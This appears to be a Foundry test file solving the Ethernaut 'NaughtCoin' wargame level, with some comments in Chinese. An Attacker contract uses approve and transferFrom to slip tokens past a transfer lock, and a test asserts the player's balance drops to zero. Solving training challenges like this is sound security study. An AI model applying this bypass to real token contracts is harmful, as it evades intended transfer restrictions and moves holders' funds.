// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/Level15.sol";

contract Attacker is Test {
    NaughtCoin level;

    constructor(address targetAddr) {
        level = NaughtCoin(payable(targetAddr));
    }

    function attack() public {
        // 发送
        address testAccount1 = vm.addr(1);

        address player = msg.sender;
        uint amount = level.balanceOf(player);

        console.log();
        level.approve(testAccount1, amount);

        // 给测试账号存入一些 Ether
        vm.deal(testAccount1, 100 ether);

        // vm.startBroadcast(privateKey);
        vm.prank(testAccount1);

        level.transferFrom(player, testAccount1, amount);

        // vm.stopBroadcast();
        vm.stopPrank();
    }
}

contract TestContract is Test {
    NaughtCoin level;
    Attacker public attacker;

    address player = address(this);

    function setUp() public {
        player = address(this);
        level = new NaughtCoin(player);
        attacker = new Attacker(address(level));
    }

    function test_transfer() public {
        uint balanceBefore = level.balanceOf(player);

        assertEq(balanceBefore, level.INITIAL_SUPPLY());

        attacker.attack();

        uint balanceAfter = level.balanceOf(player);
        assertEq(balanceAfter, 0);
    }
}
